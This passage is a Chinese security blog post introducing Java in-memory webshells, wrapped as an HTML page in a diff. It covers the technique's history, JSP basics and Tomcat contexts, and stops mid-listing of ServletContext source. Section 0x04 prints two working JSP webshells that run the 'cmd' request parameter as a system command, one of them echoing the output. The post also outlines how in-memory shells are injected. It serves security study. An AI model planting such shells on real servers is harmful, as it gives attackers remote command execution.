@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            Java内存马系列-02-内存马介绍 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Java内存马系列-02-内存马介绍</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-08-21 09:40:22</span>
+        <span class="mobile">2022-08-21 09:40</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-09-23 19:15:49</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.6k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>10 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="Java-内存马系列-02-内存马介绍"><a href="#Java-内存马系列-02-内存马介绍" class="headerlink" title="Java 内存马系列-02-内存马介绍"></a>Java 内存马系列-02-内存马介绍</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Java 内存马这一块要学的基础知识还是蛮多的，所以还是先把基础打牢了，再去看攻击方法比较好。</p>
+<h2 id="0x02-内存马简史"><a href="#0x02-内存马简史" class="headerlink" title="0x02 内存马简史"></a>0x02 内存马简史</h2><p>由于现在各种防护措施越来越多，文件shell就如c0ny1师傅所说的大部分已经气数已尽，内存马因其隐蔽性等优点从而越来越盛行。</p>
+<p>其实内存马由来已久，早在17年n1nty师傅的<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">《Tomcat源码调试笔记-看不见的shell》</a>中已初见端倪，但一直不温不火。后经过rebeyong师傅使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/rebeyond/p/9686213.html">agent技术</a>加持后，拓展了内存马的使用场景，然终停留在奇技淫巧上。在各类hw洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。特别是今年在shiro的回显研究之后，引发了无数安全研究员对内存webshell的研究，其中涌现出了LandGrey师傅构造的<a target="_blank" rel="noopener" href="https://landgrey.me/blog/12/">Spring controller内存马</a>。至此内存马开枝散叶发展出了三大类型：</p>
+<ol>
+<li>servlet-api类<ul>
+<li>filter型</li>
+<li>servlet型</li>
+</ul>
+</li>
+<li>spring类<ul>
+<li>拦截器</li>
+<li>controller型</li>
+</ul>
+</li>
+<li>Java Instrumentation类<ul>
+<li>agent型</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>在讲内存马之前，我们还是看一看 jsp 基础。</p>
+</blockquote>
+<h2 id="0x03-JSP-基础"><a href="#0x03-JSP-基础" class="headerlink" title="0x03 JSP 基础"></a>0x03 JSP 基础</h2><ul>
+<li>首先是 JSP 环境的搭建，我们要起一个 JSP 的环境，有的教程说起 SpringMVC 的，其实完全没必要，简单的 JSP 即可。</li>
+</ul>
+<h3 id="1-什么是JSP"><a href="#1-什么是JSP" class="headerlink" title="1. 什么是JSP"></a>1. 什么是JSP</h3><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p>
+<p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p>
+<p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p>
+<h3 id="2-JSP-环境的搭建"><a href="#2-JSP-环境的搭建" class="headerlink" title="2. JSP 环境的搭建"></a>2. JSP 环境的搭建</h3><p>可以直接看我这篇文章，其他文章感觉说的有点玄乎了，其实 IDEA 里面内置了 JSP 的项目框架，可以直接搭建的。</p>
+<p><a href="https://drun1baby.github.io/2022/08/22/Servlet-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/">Servlet 项目搭建</a></p>
+<h3 id="3-JSP的语法"><a href="#3-JSP的语法" class="headerlink" title="3. JSP的语法"></a>3. JSP的语法</h3><h4 id="脚本程序"><a href="#脚本程序" class="headerlink" title="脚本程序"></a>脚本程序</h4><p>脚本程序可以包含任意量的Java语句、变量、方法或表达式，只要它们在脚本语言中是有效的。脚本程序的格式如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span> 代码片段 <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>下面是使用示例</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span>  
+<span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span>  
+<span class="token generics"><span class="token punctuation">&lt;</span>h2<span class="token punctuation">></span></span><span class="token class-name">Hello</span> <span class="token class-name">World</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>  
+<span class="token operator">&lt;</span><span class="token operator">%</span> out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"GoodBye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>  
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>  
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h4><p>一个声明语句可以声明一个或多个变量、方法，供后面的 Java 代码使用。JSP 声明语句格式如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span> 声明  <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>同样等价于下面的XML语句</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">jsp:</span>declaration</span><span class="token punctuation">></span></span>   
+代码片段
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">jsp:</span>declaration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/ScriptProgram.png" class="">
+
+<p>下面是使用示例</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span>
+<span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span>
+<span class="token generics"><span class="token punctuation">&lt;</span>h2<span class="token punctuation">></span></span><span class="token class-name">Hello</span> <span class="token class-name">World</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span> <span class="token class-name">String</span> s<span class="token operator">=</span> <span class="token string">"GoodBye!"</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span> out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/JSPDeclare.png" class="">
+
+<p>其实在脚本里面也是可以直接进行声明的</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>  
+    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  
+<span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="JSP-表达式"><a href="#JSP-表达式" class="headerlink" title="JSP 表达式"></a>JSP 表达式</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%=</span> 表达式 <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>等价于下面的XML表达式</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">jsp:</span>expression</span><span class="token punctuation">></span></span>   表达式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">jsp:</span>expression</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>下面是使用示例</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span>
+<span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span>
+<span class="token generics"><span class="token punctuation">&lt;</span>h2<span class="token punctuation">></span></span><span class="token class-name">Hello</span> <span class="token class-name">World</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>
+<span class="token generics"><span class="token punctuation">&lt;</span>p<span class="token punctuation">></span></span><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"Drunkbaby"</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>username<span class="token operator">:</span><span class="token operator">&lt;</span><span class="token operator">%=</span>name<span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出如图</p>
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/JSPExpression.png" class="">
+
+<h4 id="JSP-指令"><a href="#JSP-指令" class="headerlink" title="JSP 指令"></a>JSP 指令</h4><p>JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令</p>
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/ThreeJSPCommand.png" class="">
+<p>比如我们能通过page指令来设置jsp页面的编码格式</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page language<span class="token operator">=</span><span class="token string">"java"</span> contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>回显是一样的，因为 JSP 属于模板引擎</p>
+<h4 id="JSP-注释"><a href="#JSP-注释" class="headerlink" title="JSP 注释"></a>JSP 注释</h4><p>格式如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">--</span> 注释内容 <span class="token operator">--</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="4-JSP内置对象"><a href="#4-JSP内置对象" class="headerlink" title="4. JSP内置对象"></a>4. JSP内置对象</h3><p>JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下</p>
+<ul>
+<li>由 JSP 规范提供，不用编写者实例化</li>
+<li>通过 Web 容器实现和管理</li>
+<li>所有 JSP 页面均可使用</li>
+<li>只有在脚本元素的表达式或代码段中才能使用</li>
+</ul>
+<table>
+<tbody>
+<tr>
+<th>
+对&nbsp; 象</th>
+<th>
+类型</th>
+<th>
+说&nbsp; 明</th>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/request.html" target="_blank">request</a></td>
+<td>
+javax.servlet.http.HttpServletRequest</td>
+<td>
+获取用户请求信息</td>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/response.html" target="_blank">response</a></td>
+<td>
+javax.servlet.http.HttpServletResponse</td>
+<td>
+响应客户端请求，并将处理信息返回到客户端</td>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/out.html" target="_blank">out</a></td>
+<td>
+javax.servlet.jsp.JspWriter</td>
+<td>
+输出内容到 HTML 中</td>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/session.html" target="_blank">session</a></td>
+<td>
+javax.servlet.http.HttpSession</td>
+<td>
+用来保存用户信息</td>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/application.html" target="_blank">application</a></td>
+<td>
+javax.servlet.ServletContext</td>
+<td>
+所有用户共享信息</td>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/config.html" target="_blank">config</a></td>
+<td>
+javax.servlet.ServletConfig</td>
+<td>
+这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数</td>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/pagecontext.html" target="_blank">pageContext</a></td>
+<td>
+javax.servlet.jsp.PageContext</td>
+<td>
+JSP 的页面容器，用于访问&nbsp;page、request、application 和 session 的属性</td>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/page_object.html" target="_blank">page</a></td>
+<td>
+javax.servlet.jsp.HttpJspPage</td>
+<td>
+类似于 Java 类的 this 关键字，表示当前 JSP 页面</td>
+</tr>
+<tr>
+<td>
+<a href="/jsp2/page.html" target="_blank">exception</a></td>
+<td>
+java.lang.Throwable</td>
+<td>
+该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="0x04-传统内存马"><a href="#0x04-传统内存马" class="headerlink" title="0x04 传统内存马"></a>0x04 传统内存马</h2><ul>
+<li>讲完了 Tomcat 架构的理解和 JSP 的一些基础，我们可以正式开始学习内存马了</li>
+</ul>
+<p>我们先来看一看传统的 JSP 内存马是什么样子的。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span> 
+
+    <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面是最简单的一句话木马，没有回显，适合用来反弹shell。我们这里弹个计算器看一看。</p>
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/RuntimeCommonHorse.png" class="">
+
+<p>下面是一个带回显的JSP木马</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/MessageBackJSP.png" class="">
+
+<p>传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称”无文件马”，相较于传统的JSP木马，其最大的特点就是无文件落地，存在于内存之中，隐蔽性强。</p>
+<ul>
+<li>利用Java Web组件：动态添加恶意组件，如Servlet、Filter、Listener等。在Spring框架下就是Controller、Intercepter。</li>
+<li>修改字节码：利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。</li>
+</ul>
+<h2 id="0x05-Tomcat-中的三个-Context-的理解"><a href="#0x05-Tomcat-中的三个-Context-的理解" class="headerlink" title="0x05 Tomcat 中的三个 Context 的理解"></a>0x05 Tomcat 中的三个 Context 的理解</h2><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><p>context是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？</p>
+<p>根据yzddmr6师傅的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。</p>
+<p>在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。</p>
+<h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>ServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。</p>
+<p>大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet</span><span class="token punctuation">;</span>
+ 
+ 
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Enumeration</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">EventListener</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span><span class="token punctuation">;</span>
